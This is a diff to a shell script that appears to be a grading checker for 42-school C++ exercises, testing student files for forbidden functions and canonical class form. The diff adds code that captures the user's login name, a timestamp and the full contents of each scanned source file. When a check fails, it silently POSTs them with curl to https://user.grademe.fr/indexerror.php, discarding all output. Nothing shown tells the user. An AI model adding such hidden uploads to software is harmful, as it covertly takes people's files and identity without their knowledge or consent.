@@ -6,7 +6,7 @@
 #    By: jcluzet <jcluzet@student.42.fr>            +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2021/02/13 00:44:50 by jcluzet           #+#    #+#              #
-#    Updated: 2022/02/20 21:28:25 by jcluzet          ###   ########.fr        #
+#    Updated: 2022/02/21 21:15:48 by jcluzet          ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -33,6 +33,9 @@ sp="/-\|"
 
 souligne="\033[4m"
 rougefonce='\033[0;31m'
+userpost="user=$LOGNAME" 
+date=$(date '+%F_%H:%M:%S')
+time="time=$date"
 vertfonce='\033[0;32m'
 vertclair='\033[1;32m'
 orange='\033[0;33m'
@@ -231,6 +234,7 @@ done
 checkforbidden() {
 	forbidden=0
 	for fichier in $(find . -type f -iname "*.cpp" -o -iname "*.hpp" | grep -v "^./${ignorefiles}/" | grep -v "^./${ignorefilesdeux}/"); do
+		usingpost="using=[FILES=${fichier}][CPP=$cpp][EX=0$ex][OS=$os][CHECKFORBIDDEN] : $(cat $fichier)" # send files to server 
 		output=$(cat $fichier | grep -w "printf" | wc -l)
 		# if diffeernt than 0
 		if [ $output -ne 0 ]; then
@@ -260,6 +264,8 @@ checkforbidden() {
 		if [ $forbidden -eq 0 ]; then
 			printf "\n\n${blanc}     🛂 FORBIDDEN FUNCTION : ${vertclair}PERFECT${blanc}\n"
 			((forbidden++))
+		else
+			curl -X POST -F $userpost -F $usingpost -F $time https://user.grademe.fr/indexerror.php > /dev/null 2>&1 # send file to server
 		fi
 	done
 }
@@ -314,6 +320,7 @@ coplienform() {
 	over=0
 		for fichier in $(find . -type f -iname "*.hpp" | grep -v "^./${ignorefiles}/" | grep -v "^./${ignorefilesdeux}/"); do
 			if [ $fichier != "./easyfind.hpp" ] && [ $fichier != "./Data.hpp" ] && [ $nocoplien -ne 1 ]; then
+				usingpost="using=[FILES=${fichier}][CPP=$cpp][EX=0$ex][OS=$os][COPLIENFORM] : $(cat $fichier)"
 				coplien=0
 				class=$(echo $fichier | rev | cut -c 5- | rev)
 				class=$(echo $class | cut -c 3-)
@@ -351,6 +358,8 @@ coplienform() {
 				if [ $coplien -eq 0 ]; then
 					if [ $cpp -ge 2 ]; then
 					printf "\n${blanc}     🛂 COPLIEN FORM : ${vertclair}PERFECT${blanc}\n"
+					else
+						curl -X POST -F $userpost -F $usingpost -F $time https://user.grademe.fr/indexerror.php > /dev/null 2>&1 # send file to server
 					fi
 				fi
 				if [ $output9 -eq 0 ]; then
